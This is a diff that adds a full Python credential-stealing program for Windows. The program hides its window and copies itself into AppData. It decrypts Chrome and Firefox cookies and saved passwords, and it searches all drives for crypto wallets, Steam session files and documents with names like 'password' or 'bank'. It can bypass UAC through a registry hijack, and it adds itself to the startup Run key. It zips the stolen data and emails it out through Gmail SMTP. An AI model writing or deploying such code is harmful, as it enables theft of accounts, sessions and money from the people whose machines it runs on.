@@ -1,0 +1,342 @@
+import os
+import platform
+import glob
+import sqlite3
+import win32crypt
+import json
+import win32api
+import base64
+import zipfile
+import smtplib 
+from email.mime.multipart import MIMEMultipart 
+from email.mime.text import MIMEText 
+from email.mime.base import MIMEBase 
+from email import encoders 
+import socket
+import datetime
+import shutil
+import sys
+import random
+import string
+import subprocess
+import time
+import ctypes
+import winreg
+import win32gui, win32con
+import win32ui
+def HIDE():
+    The_program_to_hide = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)
+def Chrome_cookies():
+    try:
+        LOCAL_APPDATA =  os.getenv('LOCALAPPDATA')
+        cookies_path1 = LOCAL_APPDATA+"\\Google\\Chrome\\User Data\\Default\\Cookies"
+        if(os.path.isfile(cookies_path1) == True):
+            Chrome_cookies_SQL(cookies_path1)
+    except:
+        pass
+def Chrome_cookies_SQL(path):
+    try:
+        conn = sqlite3.connect(path)
+        cur = conn.cursor()
+        try:
+            data = cur.execute('select host_key, "TRUE", path, "FALSE", expires_utc, name, value, encrypted_value from cookies')
+        except:
+            pass
+        mydata = data.fetchall()
+        count = len(mydata)
+        all_cookies = []
+        for x in range(count):
+            cookies_of_website = []
+            url = mydata[x][0]
+            cookies_of_website.append(url)
+            path = mydata[x][2]
+            cookies_of_website.append(path)
+            name = mydata[x][5]
+            cookies_of_website.append(name)
+            value = mydata[x][6]
+            cookies_of_website.append(value)
+            value_D = win32crypt.CryptUnprotectData(mydata[x][7], None, None, None, 0)[1]
+            cookies_of_website.append(value_D)
+            all_cookies.append(cookies_of_website)
+        SENDER(all_cookies,"Cookies_CHROME") 
+    except:
+        pass
+def Chrome_Logins():
+    try:
+        LOCAL_APPDATA =  os.getenv('LOCALAPPDATA')
+        logins_path1 = LOCAL_APPDATA+"\\Google\\Chrome\\User Data\\Default\\Login Data"
+        if(os.path.isfile(logins_path1) == True):
+            Chrome_Logins_SQL(logins_path1)
+    except:
+        pass
+def Chrome_Logins_SQL(path):
+    try:
+        conn = sqlite3.connect(path)
+        cur = conn.cursor()
+        try:
+            data = cur.execute('SELECT action_url, username_value, password_value FROM logins')
+        except:
+            pass
+        mydata = data.fetchall()
+        count = len(mydata)
+        all_logins = []
+        for x in range(count):
+            logins_of_website = []
+            url = mydata[x][0]
+            logins_of_website.append(url)
+            username = mydata[x][1]
+            logins_of_website.append(username)
+            password = win32crypt.CryptUnprotectData(mydata[x][2], None, None, None, 0)[1]
+            logins_of_website.append(password)
+            all_logins.append(logins_of_website)
+        SENDER(all_logins,"Cookies_LOGINS")
+    except:
+        pass
+def Firefox_cookies():
+    try:
+        ROAMING_APPDATA =  os.getenv('APPDATA')
+        path_1 = ROAMING_APPDATA+"\\Mozilla\\Firefox\\Profiles"
+        profile_folder1 = [f for f in os.listdir(path_1) if f.endswith('.default')]
+        profile_folder2 = [f for f in os.listdir(path_1) if f.endswith('.default-release')]
+        if(profile_folder1[0] != None):
+            if(os.path.isfile(path_1+"\\"+profile_folder1[0]+"\\cookies.sqlite") == True):
+                cookies_path1 = path_1+"\\"+profile_folder1[0]+"\\cookies.sqlite"
+                Firefox_cookies_SQL(cookies_path1)
+        if(profile_folder2[0] != None):
+            if(os.path.isfile(path_1+"\\"+profile_folder2[0]+"\\cookies.sqlite") == True):
+                cookies_path2 = path_1+"\\"+profile_folder2[0]+"\\cookies.sqlite"
+                Firefox_cookies_SQL(cookies_path2)
+    except:
+        pass
+def Firefox_cookies_SQL(path):
+    try:
+        conn = sqlite3.connect(path)
+        cur = conn.cursor()
+        try:
+            data = cur.execute('select * from moz_cookies')
+        except:
+            pass
+        mydata = data.fetchall()   
+        count = len(mydata)
+        all_cookies = []
+        for x in range(count):
+            cookies_of_website = []
+            cookies_of_website.append(mydata[x][1])#domain
+            cookies_of_website.append(mydata[x][6])#url
+            cookies_of_website.append(mydata[x][3])#name
+            cookies_of_website.append(mydata[x][4])#value
+            all_cookies.append(cookies_of_website)
+        SENDER(all_cookies,"Cookies_FIREFOX")
+    except:
+        pass
+def SENDER(data,Name):
+    try:
+        TEMP = os.getenv('TEMP')
+        data = str(data)
+        Directory = TEMP+"\\8C1C42F5-8612-4B05-55DC-7A796H2C7DC5"
+        if("Cookies_CHROME" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\COOKIES_CHROME.txt"), exist_ok=True)
+            with open(Directory+"\\COOKIES_CHROME.txt", "w") as f:
+                f.write(str(data))
+        elif("Cookies_LOGINS" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\Cookies_LOGINS.txt"), exist_ok=True)
+            with open(Directory+"\\Cookies_LOGINS.txt", "w") as f:
+                f.write(str(data))
+        elif("Cookies_FIREFOX" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\Cookies_FIREFOX.txt"), exist_ok=True)
+            with open(Directory+"\\Cookies_FIREFOX.txt", "w") as f:
+                f.write(str(data))
+        elif("WALLET" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\Wallet\\Wallet.txt"), exist_ok=True)
+            with open(Directory+"\\Wallet\\Wallet.txt", "w") as f:
+                f.write(str(data))
+        elif("INT_FILE" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\INT\\"+Name.split('FILE-')[1]), exist_ok=True)
+            with open(Directory+"\\INT\\"+Name.split('FILE-')[1], "w") as f:
+                f.write(str(data))
+        elif("SSFN" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\STEAM\\"+Name.split('SSFN-')[1]), exist_ok=True)
+            with open(Directory+"\\STEAM\\"+Name.split('SSFN-')[1], "w") as f:
+                f.write(str(data))
+        elif("VDF" in Name):
+            os.makedirs(os.path.dirname(Directory+"\\STEAM\\"+Name.split('VDF-')[1]), exist_ok=True)
+            with open(Directory+"\\STEAM\\"+Name.split('VDF-')[1], "w") as f:
+                f.write(str(data))
+    except:
+        pass
+def Find_Wallet():
+    try:
+        check = ["wallet.dat"]
+        drives = win32api.GetLogicalDriveStrings()
+        drives = drives.split('\000')[:-1]
+        for drive in drives:
+            for root, dirs, files in os.walk(drive):
+                for file in files:
+                    if any(ext in file.lower() for ext in check):
+                        path = os.path.join(root, file)      
+                        print(path)
+                        with open(path, "rb") as wallet:
+                            encoded_string = wallet.read()
+                            SENDER(encoded_string,'WALLET')
+    except:
+        pass
+def Find_Interesting_Files():
+    try:
+        check = ["password","login","credentials","bank","account"]
+        ext = [".xls",".json",".txt",".docx"]
+        drives = win32api.GetLogicalDriveStrings()
+        drives = drives.split('\000')[:-1]
+        for drive in drives:
+            for root, dirs, files in os.walk(drive):
+                for file in files:
+                    if any(ext in file.lower() for ext in check) and file.lower().endswith(tuple(ext)):
+                        path = os.path.join(root, file)
+                        with open(path, "rb") as INT_FILE:
+                            encoded_string = INT_FILE.read()
+                            SENDER(encoded_string,'INT_FILE-'+file.lower())
+    except:
+        pass
+def Steam_Stealer():
+    try:
+        drives = win32api.GetLogicalDriveStrings()
+        drives = drives.split('\000')[:-1]
+        for drive in drives:
+            for root, dirs, files in os.walk(drive):
+                for file in files:
+                    if "ssfn" in file.lower() and "steam" in os.path.join(root, file).lower():
+                        path = os.path.join(root, file)      
+                        with open(path, "rb") as wallet:
+                            encoded_string = wallet.read()
+                            SENDER(encoded_string,'SSFN-'+file)
+        for drive in drives:
+            for root, dirs, files in os.walk(drive):
+                for file in files:
+                    if ".vdf" in file.lower() and "steam" in os.path.join(root, file).lower() and "config" in os.path.join(root, file).lower():
+                        path = os.path.join(root, file)      
+                        with open(path, "rb") as wallet:
+                            encoded_string = wallet.read()
+                            SENDER(encoded_string,'VDF-'+file)
+    except:
+        pass
+def randomString(stringLength=10):
+    try:
+        letters = string.ascii_lowercase
+        return ''.join(random.choice(letters) for i in range(stringLength))
+    except:
+        pass
+def zipdir(path, ziph):
+    try:
+        # ziph is zipfile handle
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                ziph.write(os.path.join(root, file))
+    except:
+        pass
+def INSTALL():
+    if("AppData\\Roaming" not in sys.executable):
+        HIDE()
+        MBOX = 1
+        APPDATA = os.getenv('APPDATA')
+        dir = randomString()
+        file = randomString()+".exe"
+        if not os.path.exists(APPDATA+"\\"+dir+"\\"):
+            os.mkdir(APPDATA+"\\"+dir+"\\")
+        shutil.copyfile(sys.executable,APPDATA+"\\"+dir+"\\"+file)
+        os.startfile(APPDATA+"\\"+dir+"\\"+file)
+        if(MBOX == 1):
+            MESSAGE()  
+    else:
+        HIDE()
+        CHCOOKIE = 1
+        CHLOGINS = 0
+        ITFINDER = 0
+        LOG = 0
+        WFINDER = 0
+        SSTEALER = 0
+        FCOOKIES = 0
+        STARTUP = 0
+        UAC = 0
+        MBOX = 1
+        if(ctypes.windll.shell32.IsUserAnAdmin() == False and UAC == 1):
+            BYPASS()
+        if(STARTUP == 1):
+            STARTUPP()
+        while True:
+            if(CHCOOKIE == 1):
+                Chrome_cookies()
+            if(ITFINDER == 1):
+                Find_Interesting_Files()
+            if(WFINDER == 1):
+                Find_Wallet()
+            if(SSTEALER == 1):
+                Steam_Stealer()
+            if(FCOOKIES == 1):
+                Firefox_cookies()
+            if(CHLOGINS == 1):
+                Chrome_Logins()
+            ZIP_AND_SEND()
+            time.sleep(LOG*60)
+def BYPASS():
+    try:
+        DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key,DELEGATE_EXEC_REG_KEY, 0, winreg.REG_SZ, '')
+        winreg.CloseKey(registry_key)
+    
+        winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
+        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(registry_key, None, 0, winreg.REG_SZ, sys.executable)
+        winreg.CloseKey(registry_key)
+        os.system(r'C:\windows\system32\ComputerDefaults.exe')
+        sys.exit(0) 
+    except:
+        pass
+def STARTUPP():
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+        open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)   
+        winreg.SetValueEx(open,"Drivers",0,winreg.REG_SZ,sys.executable) 
+        winreg.CloseKey(open)
+    except:
+        pass
+def MESSAGE():
+    TITLE = ''
+    BODY = ''
+    #ctypes.windll.user32.MessageBoxW(0, BODY, TITLE, 0)
+    response = win32ui.MessageBox(BODY, TITLE, win32con.MB_OK)
+    if response == win32con.IDOK:
+        os._exit(0)
+def ZIP_AND_SEND():
+    try:
+        zipf = zipfile.ZipFile(os.getenv('TEMP')+"\\"+'Microsoft.zip', 'w', zipfile.ZIP_DEFLATED)
+        zipdir(os.getenv('TEMP')+"\\8C1C42F5-8612-4B05-55DC-7A796H2C7DC5", zipf)
+        zipf.close()
+        fromaddr = "EMAIL address of the sender"
+        toaddr = "EMAIL address of the receiver"
+        msg = MIMEMultipart() 
+        msg['From'] = fromaddr 
+        msg['To'] = toaddr
+        msg['Subject'] =  socket.gethostname()+str(datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+        body = ""
+        msg.attach(MIMEText(body, 'plain'))
+        filename = "DATA.zip"
+        attachment = open(os.getenv('TEMP')+"\\"+'Microsoft.zip', "rb") 
+        p = MIMEBase('application', 'octet-stream') 
+        p.set_payload((attachment).read())
+        encoders.encode_base64(p)
+        p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
+        msg.attach(p) 
+        s = smtplib.SMTP('smtp.gmail.com', 587) 
+        s.starttls()
+        s.login(fromaddr, "Password_of_the_sender")
+        text = msg.as_string()
+        s.sendmail(fromaddr, toaddr, text)
+        s.quit()
+        shutil.rmtree(os.getenv('TEMP')+"\\8C1C42F5-8612-4B05-55DC-7A796H2C7DC5")
+    except:
+        pass
+if __name__== "__main__":
+    INSTALL()
